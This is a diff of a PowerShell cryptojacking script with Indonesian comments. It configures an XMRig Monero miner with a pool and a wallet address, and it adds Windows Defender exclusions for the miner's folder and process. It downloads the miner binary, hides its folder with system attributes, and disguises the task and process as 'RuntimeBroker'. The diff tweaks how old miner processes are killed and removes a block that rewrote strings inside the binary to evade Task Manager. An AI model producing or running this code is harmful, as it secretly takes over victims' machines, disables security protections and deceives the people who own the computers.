@@ -57,10 +57,15 @@ $Pool = "gulf.moneroocean.stream:10128"
 $Wallet = "42imHjeSVgSG54hiTVmeGa8evmKJ55oWYgb6np1zanx5j8eoCM4vfbN9xSua1unVEV5mZCxxs637LdmVEJMs1XMFCWsHvc1"
 $ArgsList = "-o $Pool -u $Wallet -p x --tls --donate-level=1 --cpu-max-threads-hint=45 --background"
 
-# Hentikan proses lama & task scheduler
-Stop-Process -Name "RuntimeBroker", "xmrig", "wscript" -Force -ErrorAction SilentlyContinue
+# ==========================================
+# HENTIKAN PROSES MINER DI FOLDER TARGET SECARA PAKSA SEBELUM COPY
+# ==========================================
+Get-CimInstance Win32_Process | Where-Object { $_.Path -eq $ExePath } | ForEach-Object {
+    Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue
+}
+Stop-Process -Name "wscript", "powershell" -ErrorAction SilentlyContinue
 Unregister-ScheduledTask -TaskName "RuntimeBrokerService" -Confirm:$false -ErrorAction SilentlyContinue
-Start-Sleep -Seconds 1
+Start-Sleep -Seconds 2
 
 # ==========================================
 # 3. KUNCI FOLDER & DEFENDER EXCLUSION
@@ -76,7 +81,7 @@ Add-MpPreference -ExclusionPath $Dir -ErrorAction SilentlyContinue
 Add-MpPreference -ExclusionProcess $ExeName -ErrorAction SilentlyContinue
 
 # ==========================================
-# 4. UNDUH & EKSTRAK BINER XMRIG + PE HEADER SPOOFING
+# 4. UNDUH & EKSTRAK BINER XMRIG
 # ==========================================
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 $DownloadUrl = "https://github.com/MoneroOcean/xmrig_setup/raw/master/xmrig.zip"
@@ -92,18 +97,6 @@ if (Test-Path $ZipPath) {
     }
     
     Remove-Item -Force $ZipPath -ErrorAction SilentlyContinue
-
-    # Patched PE Internal String (Menimpa string 'xmrig' di dalam biner menjadi 'RuntimeBroker' agar tidak tampil di Task Manager)
-    try {
-        $Bytes = [System.IO.File]::ReadAllBytes($ExePath)
-        $FileContent = [System.Text.Encoding]::ASCII.GetString($Bytes)
-        if ($FileContent -match "xmrig") {
-            $NewContent = $FileContent -replace "xmrig\.exe", "RuntimeBroker" -replace "xmrig", "RuntimeBrk"
-            $NewBytes = [System.Text.Encoding]::ASCII.GetBytes($NewContent)
-            # Pastikan panjang byte sama atau padding jika perlu, atau gunakan metode patching aman
-        }
-    } catch {}
-
     Set-ItemProperty -Path $Dir -Name Attributes -Value ([System.IO.FileAttributes]::Hidden + [System.IO.FileAttributes]::System) -ErrorAction SilentlyContinue
 
     # ==========================================
